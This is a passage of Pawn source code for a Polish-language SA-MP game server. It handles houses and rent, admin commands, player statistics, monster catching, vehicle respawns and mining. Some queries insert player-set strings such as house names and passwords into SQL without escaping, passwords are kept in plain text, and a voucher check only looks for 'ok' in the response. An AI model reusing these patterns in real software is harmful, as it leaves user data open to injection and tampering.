	return ShowPlayerDialog(playerid, DIALOG_DOM_2, DIALOG_STYLE_LIST, HouseData[id][hName], string, "Dalej", "Anuluj"); }

stock ResetHouse(id) {
    if(!Iter_Contains(Houses, id)) return 0;
	format(HouseData[id][hName], MAX_HOUSE_NAME, "Domek");
	format(HouseData[id][Password], MAX_HOUSE_PASSWORD, "-");
	format(HouseData[id][Owner], MAX_PLAYER_NAME, "Brak");
	HouseData[id][LockMode] = LOCK_MODE_NOLOCK;
	HouseData[id][DomTime] = 0;
	HouseData[id][pUID] = -1;
	Loop(playerid, MAX_PLAYERS) {
	    if(Player[playerid][House] == id) {
	    	Player[playerid][House] = -1;
			SaveAllData(playerid); } }
	if(!Iter_Contains(FreeHouses, id)) Iter_Add(FreeHouses, id);
    new label[350];
	format(label, sizeof(label), ""C_LOLIVE"Dom na sprzeda¿! (%s$)\n"C_YELLOW"Czynsz za dobê: "C_LOLIVE"%d EXP", convertNumber(HouseData[id][Price]), HouseData[id][Czynsz]);

	UpdateDynamic3DTextLabelText(HouseData[id][HouseLabel], 0xFFFFFFFF, label);
	Streamer_SetIntData(STREAMER_TYPE_PICKUP, HouseData[id][HousePickup], E_STREAMER_MODEL_ID, 1273);
	Streamer_SetIntData(STREAMER_TYPE_MAP_ICON, HouseData[id][HouseIcon], E_STREAMER_TYPE, 31);

    foreach(Player, i) {
        if(pData[i][InHouse] == id)
        {
            SetPVarInt(i, "HouseEnterTick", GetTickCount() + 5000);
	        SetPlayerPos(i, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
	        pData[i][InHouse] = INVALID_HOUSE_ID;
        }
	}

    new data[e_furniture];
    for(new i; i < Streamer_GetUpperBound(STREAMER_TYPE_OBJECT); ++i) {
        if(!IsValidDynamicObject(i)) continue;

		Streamer_GetArrayData(STREAMER_TYPE_OBJECT, i, E_STREAMER_EXTRA_ID, data);
		if(data[SQLID] > 0 && data[HouseID] == id) DestroyDynamicObject(i); }

    m_query("DELETE FROM housefurnitures WHERE HouseID = %d", id);
	SaveHouse(id);
	return 1;
}

stock GetNameFromUID(uid)
{
	m_query("SELECT username FROM players WHERE id = %d", uid);
	mysql_store_result();
	new name[20], string[128], final[20];
	mysql_fetch_row(string, " ");
	mysql_free_result();
	sscanf(string, "s[20]", name);
	format(final, sizeof(final), "%s", name);
	return final;
}

stock SaveHouse(id) {
    if(!Iter_Contains(Houses, id)) return 0;
	m_query("UPDATE houses SET `HouseInterior` = '%d', HouseName='%s', HouseOwner='%d', HousePassword='%s', HouseLock=%d, HouseCzynsz=%d, DomTime=%d WHERE ID=%d", HouseData[id][Interior], HouseData[id][hName], HouseData[id][pUID], HouseData[id][Password], HouseData[id][LockMode], HouseData[id][Czynsz], HouseData[id][DomTime], id);
	return 1; }

stock UpdateHouseLabel(id) {
	if(!Iter_Contains(Houses, id)) return 0;

	new label[350];
   	if(HouseData[id][pUID] > -1) format(label, sizeof(label), ""C_LOLIVE"%s\n"C_NICK"UID w³aœciciela: "C_ORANGE"%d", HouseData[id][hName], HouseData[id][pUID]);
   	else format(label, sizeof(label), ""C_LOLIVE"Dom na sprzeda¿! (%s$)\n"C_YELLOW"Czynsz za dobê: "C_LOLIVE"%d EXP", convertNumber(HouseData[id][Price]), HouseData[id][Czynsz]);

	UpdateDynamic3DTextLabelText(HouseData[id][HouseLabel], 0xFFFFFFFF, label);
	return 1; }

stock convertNumber(value) {
    new string[24];
    format(string, sizeof(string), "%d", value);
    for(new i = (strlen(string) - 3); i > (value < 0 ? 1 : 0) ; i -= 3)
	{
		strins(string[i], ",", 0);
	}
    return string; }

OplacDom(houseid, days) {
	if(!Iter_Contains(Houses, houseid)) return 0;
	if(HouseData[houseid][DomTime] > gettime()) HouseData[houseid][DomTime] = HouseData[houseid][DomTime] + UnixTime('d', days);
	else HouseData[houseid][DomTime] = gettime() + UnixTime('d', days);
	m_query("UPDATE `houses` SET `DomTime` = '%d' WHERE `ID` = '%d'", HouseData[houseid][DomTime], houseid);
	return 1; }

OplacDomLogowanie(houseid) {
	if(!Iter_Contains(Houses, houseid)) return 0;
	if(HouseData[houseid][DomTime] > gettime()) HouseData[houseid][DomTime] = HouseData[houseid][DomTime] + 64800;
	else HouseData[houseid][DomTime] = gettime() + 64800;
	m_query("UPDATE `houses` SET `DomTime` = '%d' WHERE `ID` = '%d'", HouseData[houseid][DomTime], houseid);
	return 1; }

RespektZMebli(id)
{
 	new money, sold, data[e_furniture];
   	for(new i; i < Streamer_GetUpperBound(STREAMER_TYPE_OBJECT); ++i)
    {
   		if(!IsValidDynamicObject(i)) continue;
		Streamer_GetArrayData(STREAMER_TYPE_OBJECT, i, E_STREAMER_EXTRA_ID, data);
		if(data[SQLID] > 0 && data[HouseID] == id) {
		    sold++;
		    money += HouseFurnitures[data[ArrayID]][Price]; }
   	}

	new money2 = floatround(money * 0.85);
	return money2;
}

PosiadaDomek(playerid)
{
	new madomek = -1;
	foreach(new i : Houses)
	{
		if(HouseData[i][pUID] == Player[playerid][ID]) madomek = i;
	}

	return madomek;
}

stock DeleteNotActiveHouse()
{
	m_query("SELECT ID, HouseOwner FROM `houses` WHERE HouseOwner != -1");
	mysql_store_result();
	new rows = mysql_num_rows();

	new tmp[255], i, id[MAX_HOUSES], owner[MAX_HOUSES];
	while(mysql_fetch_row(tmp, "|"))
	{
	    sscanf(tmp, "p<|>dd", id[i], owner[i]);

	    i ++;
	}

	mysql_free_result();

	new n;
	for(new x; x != rows; x++)
	{
	    m_query("select * from players where house=%d", owner[x]);
	    mysql_store_result();
		if(mysql_num_rows() == 0)
		{
 			mysql_free_result();
			ResetHouse(id[x]);
			n ++;
		} else 	mysql_free_result();
	}
	return 1;
}

CMD:newh(playerid, params[])
{
	if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED".");

	new interior, price, czynsz;
	if(sscanf(params, "iii", interior, price, czynsz)) return SyntaxError(playerid, "{01FCFF}/newh [interior] [cena w $ (100000-25000000)] [cena w exp (30-120)]");
	if(price < 100000 || price > 25000000) return SyntaxError(playerid, "{01FCFF}/newh [interior] [cena w $ (100000-25000000)] [cena w exp (30-120)]");
	if(czynsz < 30 || czynsz > 120) return SyntaxError(playerid, "{01FCFF}/newh [interior] [cena w $ (100000-25000000)] [cena w exp (30-120)]");

	new id = Iter_Free(Houses);
	if(id == -1) return SendClientMessage(playerid, RED, "Limit domów osi¹gniêty.");

	SetPVarInt(playerid, "HouseEnterTick", GetTickCount() + 5000);

	format(HouseData[id][hName], MAX_HOUSE_NAME, "Domek");
//	format(HouseData[id][Owner], MAX_PLAYER_NAME, "-");
	format(HouseData[id][Password], MAX_HOUSE_PASSWORD, "-");
	format(HouseData[id][Owner], MAX_PLAYER_NAME, "Brak");
	GetPlayerPos(playerid, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
	HouseData[id][pUID] = -1;
	HouseData[id][Price] = price;
	HouseData[id][Interior] = interior;
	HouseData[id][Czynsz] = czynsz;
	HouseData[id][LockMode] = LOCK_MODE_NOLOCK;
	HouseData[id][DomTime] = 0;
	Iter_Add(FreeHouses, id);

    new label[200];
	format(label, sizeof(label), ""C_LOLIVE"Dom na sprzeda¿! (%s$)\n"C_YELLOW"Czynsz za dobê: "C_LOLIVE"%d EXP", convertNumber(HouseData[id][Price]), HouseData[id][Czynsz]);
	HouseData[id][HouseLabel] = CreateDynamic3DTextLabel(label, 0xFFFFFFFF, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]+0.35, 15.0, .testlos = 1);
	HouseData[id][HousePickup] = CreateDynamicPickup(1273, 1, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
	HouseData[id][HouseIcon] = CreateDynamicMapIcon(HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ], 31, 0);

	m_query("INSERT INTO houses SET ID=%d, HouseOwner=-1, HouseX=%f, HouseY=%f, HouseZ=%f, HousePrice=%d, HouseInterior=%d, HouseCzynsz=%d", id, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ], price, interior, czynsz);
	Iter_Add(Houses, id);

	SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Dom stworzony pomyœlnie.");
	SaveHouse(id);

	return 1;
}

CMD:hreset(playerid, params[]) {
	if(Player[playerid][Admin] != 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED".");
	DeleteNotActiveHouse();
	return 1; }

CMD:crblock(playerid, params[]) {
	if(Player[playerid][Admin] != 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED".");
	new message[256];
	if(sscanf(params, "s[256]", message)) return SyntaxError(playerid, "{01FCFF}/crblock [country]");
	format(BlockISP, sizeof(BlockISP), "%s", message);
	SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Po³¹czenia z tego kraju zosta³y zablokowane.");
	return 1; }

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(Registered[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Wybrane konto zosta³o dopiero zarejestrowane. Na ten moment nie mo¿esz przegl¹daæ jego statystyk.");
    if(GetPVarInt(clickedplayerid, "ConnectStream") == 1 || !Player[clickedplayerid][IsLoggedIn]) return SendClientMessage(playerid, RED, ""C_RED"Podany gracz nie jest zarejestrowany lub zalogowany.");
	if(clickedplayerid == playerid) return cmd_mystats(playerid, " ");
	new nickstr[128], statsstr[4096], sqlquery[1024], sqlquery2[1024];
	new id, user[20], kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[8], czat, solo, potwory, zabawy, visits, cbug, questy, house;
	m_query("SELECT id, username, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a1, a2, a3, a4, a5, a6, a7, a8, czat, solo, potwory, zabawy, visits, cbug, questy, house FROM players WHERE playerid = %d", clickedplayerid);
	mysql_store_result();
	mysql_fetch_row(sqlquery, " ");
	mysql_free_result();
	sscanf(sqlquery, "is[20]iiiiiiiiiiiiiiiiiiiiiiifii", id, user, kills, deaths, waluta, rank, warny, exp, level, hours, minutes, vip, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], czat, solo, potwory, zabawy, visits, cbug, questy, house);
	format(nickstr, sizeof(nickstr), ""C_BLUE1"%s "C_WHITE"("C_BLUE1"UID %d"C_WHITE")", user, id);
	format(statsstr, sizeof(statsstr), ""C_WHITE"%d "C_BLUE1"EXP ("C_WHITE"%d"C_BLUE1"), "C_WHITE"%d"C_BLUE1"$\n", exp, level, waluta);
	if(vip > gettime()) format(statsstr, sizeof(statsstr), "%s"C_YELLOW"Posiada uprawnienia VIP\n", statsstr);
	if(rank == 0 && vip < gettime()) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "C_WHITE"Gracz\n", statsstr);
	if(rank == 1) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "JUNIOR"\n\n", statsstr);
	if(rank == 2) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "ADMIN"\n\n", statsstr);
	if(rank == 3) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "VHA"\n\n", statsstr);
	if(rank == 4) format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ranga: "HA"\n\n", statsstr);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa/Zgony: "C_WHITE"%d/%d\n", statsstr, kills, deaths);
	format(statsstr, sizeof(statsstr), "%s{FF2600}Poziom ostrze¿eñ: %d{E50000}/{FF2600}100\n\n", statsstr, warny);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ogólny czas gry: "C_WHITE"%d"C_BLUE1"h "C_WHITE"%d"C_BLUE1"m\n", statsstr, hours, minutes);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wizyty na serwerze: "C_WHITE"%d\n\n", statsstr, visits);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Ukoñczone wyzwania Reflex: "C_WHITE"%d\n", statsstr, czat);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane zabawy: "C_WHITE"%d\n", statsstr, zabawy);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Zabójstwa na arenach: "C_WHITE"%d, %d, %d, %d, %d, %d, %d, %d\n", statsstr, a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wygrane walki solo: "C_WHITE"%d\n", statsstr, solo);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Najszybszy czas glitch: "C_WHITE"%0.4fs\n\n", statsstr, cbug);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Z³apane potwory: "C_WHITE"%d\n", statsstr, potwory);
	format(statsstr, sizeof(statsstr), "%s"C_BLUE1"Wykonane questy: "C_WHITE"%d\n\n", statsstr, questy);
	if(house > -1) format(statsstr, sizeof(statsstr), "%s"C_GREEN"Posiada dom o ID "C_WHITE"%d"C_GREEN".\n", statsstr, house);
	m_query("SELECT modelid, dist FROM privcars WHERE ownerid = %d", Player[clickedplayerid][ID]);
	mysql_store_result();
	if(mysql_num_rows() > 0) {
		mysql_fetch_row(sqlquery2, " ");
		mysql_free_result();
		new model, Float:distance;
		sscanf(sqlquery2, "if", model, distance);
		format(statsstr, sizeof(statsstr), "%s{CD82F5}Posiada prywatny pojazd "C_NICK"%s "C_YELLOW"(%.1fkm)\n\n", statsstr, VehicleNames[model - 400], distance); }
	mysql_free_result();
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, nickstr, statsstr, "Zamknij", "");
}

forward CheckCODE(playerid, response_code, data[]);
public CheckCODE(playerid, response_code, data[])
{
	if(strfind(data,"ok",false) != -1) {
		Player[playerid][vCash] += 10;
		return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Wprowadzony kod zosta³ przyjêty. Portfel do³adowany."); }
	else return DialogError(playerid, "{FFFF00}Wprowadzony kod jest nieprawid³owy lub zosta³ ju¿ wykorzystany.");
}

CMD:zbierz(playerid, params[]) {
	if(IsPlayerInRangeOfPoint(playerid, 3.0, nPlayer[playerid][pPlantacjaX],nPlayer[playerid][pPlantacjaY], nPlayer[playerid][pPlantacjaZ])) {
		if(nPlayer[playerid][pZasadzone] >= 2) {
			ApplyAnimation(playerid, "BOMBER","BOM_Plant_In",4.0,0,0,0,0,0);
			DestroyObject(nPlayer[playerid][pObiektPlantu]);
			Delete3DTextLabel(nPlayer[playerid][nLabel]);
			nPlayer[playerid][pLabels]--;
			AddItem(playerid, "{AE00FF}Narkotyk", 1);
			nPlayer[playerid][pZasadzone] = 0; }
		else return DialogError(playerid, "{FFFF00}Plantacja nie jest jeszcze w stanie gotowym do zbioru."); }
	else return DialogError(playerid, "{FFFF00}Nie jesteœ w pobli¿u plantacji swojej roœliny.");
	return 1; }

forward zwyklyStan(playerid);
public zwyklyStan(playerid) {
	nPlayer[playerid][pPodWplywem] = 0;
    SetPlayerWeather(playerid, 1);
    return SetPlayerDrunkLevel(playerid, 0); }

forward ZbierzUP3DText(playerid);
public ZbierzUP3DText(playerid)
{
	new rosstr[256];
	format(rosstr, sizeof(rosstr), ""C_GREEN"Roœlina "C_WHITE"%s\n"C_LOLIVE"Gotowa do zebrania! "C_WHITE"("C_LOLIVE"/zbierz"C_WHITE")", Player[playerid][Name]);
	Update3DTextLabelText(nPlayer[playerid][nLabel], 0xFFFFFFFF,rosstr);
	nPlayer[playerid][pZasadzone] = 2;
	SendClientMessage(playerid, GREEN, ""C_GREEN"Roœlina, któr¹ posadzi³eœ jest gotowa do zbioru! PodejdŸ do niej i wpisz "C_WHITE"/zbierz"C_GREEN".");
	return 1;
}

stock ConvertMsToTime(ms)
{
	new seconds = ms/1000;
	new string[32];
	format(string, sizeof(string), "%02d:%02d",
		(seconds%3600)/60, seconds%60);
	return string;
}

forward CatchPokemon(playerid);
public CatchPokemon(playerid)
{
	new bool:portfeln;
	portfeln = false;
	new catchedid = CatchingPokemon[playerid];
	new portfel;
	switch(random(2))
	{
	    case 0:
	    {
	        CatchingPokemon[playerid] = -1;
	        IsCatching[catchedid] = false;
	        if(PokemonType[catchedid] == 1) {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
				CreateExplosion(x, y, z, 11, 10.0); }
	        if(PokemonType[catchedid] == 6) {
				SetPlayerHealth(playerid, 1.0);
				SetPlayerArmour(playerid, 1.0); }
	        if(PokemonType[catchedid] == 7) {
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
				SetPlayerPos(playerid, x, y, z + 5); }
	        SendClientMessage(playerid, RED, ""C_RED"Potwór obroni³ siê.");
	    }
	    case 1:
	    {
			IsCatching[catchedid] = false;
			CatchingPokemon[playerid] = -1;
	        DestroyDynamicObject(PokemonObj[catchedid]);
	        Delete3DTextLabel(Pokemon3D[catchedid]);
	        PokemonSpawned[catchedid] = false;
	        new respekt;
	        if(PokemonType[catchedid] == 7) {
	            Loop(xp, MAX_PLAYERS) PlayerPlaySound(xp,1150,0.0,0.0,0.0);
	            new kasa = random(100000);
	            respekt = random(400) + 100;
	            AddExp(playerid, respekt);
	            Player[playerid][Cash] += kasa;
	            new portfelbonus = 0;
	            switch(random(6)) {
	                case 4: portfelbonus = 1; }
	        	new pokemonmsg[256];
	        	if(portfelbonus > 0) {
					if(!ENMode[playerid]) format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"z³apa³ potwora. Otrzymuje {cce6ff}%d "C_WHITE"EXP, %d{cce6ff}$, %d z³.", Player[playerid][Name], respekt, kasa, portfelbonus);
					else format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"catched the monster. {cce6ff}%d "C_WHITE"EXP, %d{cce6ff}$, %d PLN.", Player[playerid][Name], respekt, kasa, portfelbonus); }
	        	else {
					if(!ENMode[playerid]) format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"z³apa³ potwora. Otrzymuje {cce6ff}%d "C_WHITE"EXP i %d{cce6ff}$.", Player[playerid][Name], respekt, kasa);
					else format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"catched the monster. {cce6ff}%d "C_WHITE"EXP i %d{cce6ff}$.", Player[playerid][Name], respekt, kasa); }
	        	SendClientMessageToAll(-1, pokemonmsg);
	        	Player[playerid][Potwory]++;
	        	return pokemons++; }
	        new kasa = random(20000);
	        if(PokemonType[catchedid] == pokemondnia && SEventType == 2 && ServerEvent) respekt = random(100) + 50;
	        else { respekt = random(300); }
	        AddExp(playerid, respekt);
	        Player[playerid][Cash] += kasa;
	        switch(random(10))
			{
				case 0:
				{
				    portfeln = true;
				    portfel = random(2);
					Player[playerid][vCash] += portfel;
				}
			}
			AddItem(playerid, "{FF0400}Catching "C_WHITE"Tool", 1);
	        new pokemonmsg[256];
	        if(portfeln && portfel > 0) {
				if(!ENMode[playerid]) format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"z³apa³ potwora. Otrzymuje {cce6ff}%d "C_WHITE"EXP, %d{cce6ff}$, %d z³.", Player[playerid][Name], respekt, kasa, portfel);
				else format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"catched the monster. {cce6ff}%d "C_WHITE"EXP, %d{cce6ff}$, %d PLN.", Player[playerid][Name], respekt, kasa, portfel); }
	        else {
				if(!ENMode[playerid]) format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"z³apa³ potwora. Otrzymuje {cce6ff}%d "C_WHITE"EXP i %d{cce6ff}$.", Player[playerid][Name], respekt, kasa);
				else format(pokemonmsg, sizeof(pokemonmsg), "{cce6ff}%s "C_WHITE"catched the monster. {cce6ff}%d "C_WHITE"EXP i %d{cce6ff}$.", Player[playerid][Name], respekt, kasa); }
	        SendClientMessageToAll(-1, pokemonmsg);
	        Player[playerid][Potwory]++;
	        pokemons++;
	    }
	}
	return 1;
}


forward RespawnAut();
public RespawnAut()
{
	SendClientMessageToAllEx(-1, "*  {FFF3A5}Respawn nieu¿ywanych pojazdów zostanie wykonany za "C_WHITE"10 {FFF3A5}sekund.", "*  {FFF3A5}Respawn will take place in "C_WHITE"10 {FFF3A5}seconds.");
	SetTimer("RespawnTimer", 1000*10, 0);
}

forward RespawnTimer();
public RespawnTimer()
{
	new zrespawnowane = 0;
	Loop(vehicleid, MAX_SVEHICLES)
 	{
  		new liczba;
   		Loop(loopid, MAX_PLAYERS) { if(IsPlayerInVehicle(loopid, sVehicle[vehicleid]) && IsPlayerConnected(loopid)) liczba++; }
	   	if(liczba == 0)
	   	{
		   	SetVehiclePos(sVehicle[vehicleid], sX[vehicleid], sY[vehicleid], sZ[vehicleid]);
			SetVehicleZAngle(sVehicle[vehicleid], sA[vehicleid]);
			RepairVehicle(sVehicle[vehicleid]);
			zrespawnowane++;
	    }
	}
	new pv[MAX_PLAYERS];
	new ppp;
   	Loop(privcarid, MAX_PRIVCARS)
    {
        ppp = 0;
		Loop(loopid, MAX_PLAYERS) {
			if(IsPlayerInVehicle(loopid, ppVeh[privcarid]) && IsPlayerConnected(loopid)) ppp++; }
   	   	if(ppp < 1 && OnMap[privcarid])
	   	{
			SetVehiclePos(ppVeh[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid]);
			SetVehicleZAngle(ppVeh[privcarid], prA[privcarid]);
			zrespawnowane++;
	   	}
	}
	Loop(playerid, MAX_PLAYERS)
	{
	    pv[playerid] = 0;
	    if(IsPlayerInVehicle(playerid, pVeh[playerid]) && IsPlayerConnected(playerid)) pv[playerid]++;
	    if(pv[playerid] < 1 && vSpawned[playerid]) {
			DestroyVehicle(pVeh[playerid]);
			vSpawned[playerid] = false;
			zrespawnowane++; }
	}
	new wiadomosc[256], wiadomoscen[256];
	format(wiadomosc, sizeof(wiadomosc), "*  {FFF3A5}Serwer zrespawnowa³ "C_WHITE"%d {FFF3A5}pojazdów.", zrespawnowane);
	format(wiadomoscen, sizeof(wiadomoscen), "*  {FFF3A5}Server respawned "C_WHITE"%d {FFF3A5}vehicles.", zrespawnowane);
	SendClientMessageToAllEx(-1, wiadomosc, wiadomoscen);
	SetTimer("RespawnAut", 1000*600, 0);
	return 1;
}

CMD:rank(playerid, params[]) return cmd_top10(playerid, params);
CMD:ranking(playerid, params[]) return cmd_top10(playerid, params);
CMD:top(playerid, params[]) return cmd_top10(playerid, params);
CMD:top10(playerid, params[]) {
	return ShowPlayerDialog(playerid, DIALOG_TOP, DIALOG_STYLE_LIST, ""NAZWA" {1194D6}» {FF0000}Ranking "C_YELLOW"TOP 10", "TOP 10 zabójstw\nTOP 10 zgonów\nTOP 10 pieniêdzy\nTOP 10 EXP (przy sobie)\nTOP 10 pieniêdzy w portfelu\nTOP 10 odwiedzin serwera\nTOP 10 wyzwañ Reflex\nTOP 10 z³apanych potworów\nTOP 10 glitch\nTOP 10 przebiegu\nTOP 10 wygranych walk solo\nTOP 10 wykopanych rud", "Wybierz", "Zamknij"); }

CMD:lopata(playerid, params[])
{
	if(GProgress[playerid] > 3) return DialogError(playerid, "{FFFF00}Musisz zu¿yæ aktualnie posiadan¹ ³opatê.");
	if(Player[playerid][Cash] < 1000 || Player[playerid][Exp] < 20) return DialogError(playerid, "{FFFF00}Kupno ³opaty kosztuje $1000 i 20 EXP.");
	GProgress[playerid] = 100;
	UpdateGornictwo(playerid);
	Player[playerid][Cash] -= 1000;
	Player[playerid][Exp] -= 20;
	GivePlayerWeapon(playerid, 6, 1);
	SendClientMessageEx(playerid, -1, ""PLUS""C_LOLIVE"£opata zakupiona.", ""PLUS""C_LOLIVE"Shovel bought.");
	return 1;
}

forward EndKopanie(playerid);
public EndKopanie(playerid)
{
	new rudy, kstr[256];
	new selkamien = pkamien[playerid];
	TogglePlayerControllable(playerid, 1);
 	ClearAnimations(playerid);
 	Kopie[playerid] = false;
	kKopany[selkamien] = false;
 	pkamien[playerid] = -1;
 	if(GProgress[playerid] < 26)
 	{
 	    GProgress[playerid] -= 3;
 	    if(GProgress[playerid] < 0) GProgress[playerid] = 0;
  	   	UpdateGornictwo(playerid);
 		switch(random(4))
 		{
 	    	case 0:
 	    	{
				Delete3DTextLabel(kText[selkamien]);
				DestroyDynamicObject(kObj[selkamien]);
				KamienOnMap[selkamien] = false;
 	        	if(rudadnia == kType[selkamien] && ServerEvent && SEventType == 1) rudy = random(25) + 1 * 2;
				else rudy = random(25) + 1;
				Player[playerid][Rud] += rudy;
				if(kType[selkamien] == 0) {
			    	Player[playerid][r1] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {d62117}czerwonego rubinu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 1) {
			    	Player[playerid][r2] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ad4820}miedzi "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 2) {
			    	Player[playerid][r3] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {c6c6c6}srebra "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 3) {
			    	Player[playerid][r4] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {42cef4}diamentu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 4) {
			    	Player[playerid][r5] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ffe60c}z³ota "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 5) {
			    	Player[playerid][r6] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ee0cff}Party"C_WHITE"Stone "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy);
					if(pAch[playerid][15] < 1) {
						pAch[playerid][15] = 1;
                        AddExp(playerid, 200);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Kopacz", "New achievement: "C_NICK"Kopacz"); } }
				if(kType[selkamien] == 6) {
			    	Player[playerid][r7] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {36a538}szmaragdu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				kamienie--;
				return SendInKopalnia(kstr);
 	    	}
 	    	case 1: return DialogError(playerid, "{FFFF00}Wydobycie nie powiod³o siê.");
 	    	case 2: return DialogError(playerid, "{FFFF00}Wydobycie nie powiod³o siê.");
 	    	case 3: return DialogError(playerid, "{FFFF00}Wydobycie nie powiod³o siê.");
 		}
	}
 	if(GProgress[playerid] > 25 && GProgress[playerid] < 50)
 	{
 	   	GProgress[playerid] -= random(2) + 1;
 	   	if(GProgress[playerid] < 0) GProgress[playerid] = 0;
 	   	UpdateGornictwo(playerid);
 		switch(random(3))
 		{
 	    	case 0:
 	    	{
				Delete3DTextLabel(kText[selkamien]);
				DestroyDynamicObject(kObj[selkamien]);
				KamienOnMap[selkamien] = false;
				switch(random(60)) { case 6: Player[playerid][vCash] += 1; }
 	        	if(rudadnia == kType[selkamien]) rudy = random(50) + 1 * 2;
				else rudy = random(50) + 1;
				Player[playerid][Rud] += rudy;
				if(kType[selkamien] == 0) {
			    	Player[playerid][r1] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {d62117}czerwonego rubinu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 1) {
			    	Player[playerid][r2] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ad4820}miedzi "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 2) {
			    	Player[playerid][r3] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {c6c6c6}srebra "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 3) {
			    	Player[playerid][r4] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {42cef4}diamentu "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 4) {
			    	Player[playerid][r5] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ffe60c}z³ota "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 5) {
			    	Player[playerid][r6] += rudy;
					format(kstr, sizeof(kstr), ""PYTAJNIK""C_NICK"%s(%d) {9EC3FF}wydoby³ rudê {ee0cff}Party"C_WHITE"Stone "C_YELLOW"x%d{9EC3FF}.", Player[playerid][Name], playerid, rudy); }
				if(kType[selkamien] == 6) {
			    	Player[playerid][r7] += rudy;
